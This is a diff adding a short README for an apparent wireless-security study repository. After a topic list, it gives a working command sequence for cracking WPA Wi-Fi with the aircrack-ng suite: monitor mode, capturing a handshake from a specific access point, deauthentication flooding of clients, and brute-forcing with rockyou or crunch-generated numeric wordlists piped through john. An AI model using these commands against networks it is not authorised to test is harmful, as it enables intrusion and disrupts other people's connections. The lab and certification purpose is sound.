@@ -1,0 +1,38 @@
+📡 Wireless Security Projects & Research
+This repository contains tools, scripts, and research focused on wireless network security, covering various wireless communication protocols and associated attack vectors. Topics include:
+
+🛠️ Wi-Fi (802.11) Security Analysis
+
+🔓 WPA/WPA2/WPA3 Cracking Techniques
+
+📶 Wireless Packet Sniffing (Aircrack-ng, Wireshark, Kismet)
+
+🐍 Python Scripts for Wireless Attacks & Defense
+
+🛰️ Bluetooth & RFID Security Testing
+
+🧪 Lab Setups for Wireless Penetration Testing
+
+📚 Research on Wireless Security Protocols & Vulnerabilities
+
+Whether you're building a personal lab, studying for certifications (like OSWP or CEH), or conducting real-world assessments, this repo serves as a practical and educational resource.
+
+
+iwconfig
+airmon-ng start wlan0
+iwconfig
+airmon-ng check kill
+airodump-ng wlan0
+airodump-ng --bssid AE:A2:94:B1:F5:AE -c 11 -w akku wlan0
+aireplay-ng -0 100 -a AE:A2:94:B1:F5:AE wlan0 
+aircrack-ng -w /usr/share/wordlist/rockyou.txt akwifi-01.cap
+
+
+#live cracking
+crunch 10 10 1234567890 | aircrack-ng -w - akku-01.cap -e Akshay
+
+#live pause and resume cracking
+
+crunch 10 10 1234567890 | john --stdin --stdout --session=ak | aircrack-ng -w - akku-01.cap -e Akshay
+
+crunch 10 10 1234567890 | john --stdin --stdout --restore=ak | aircrack-ng -w - akku-01.cap -e Akshay
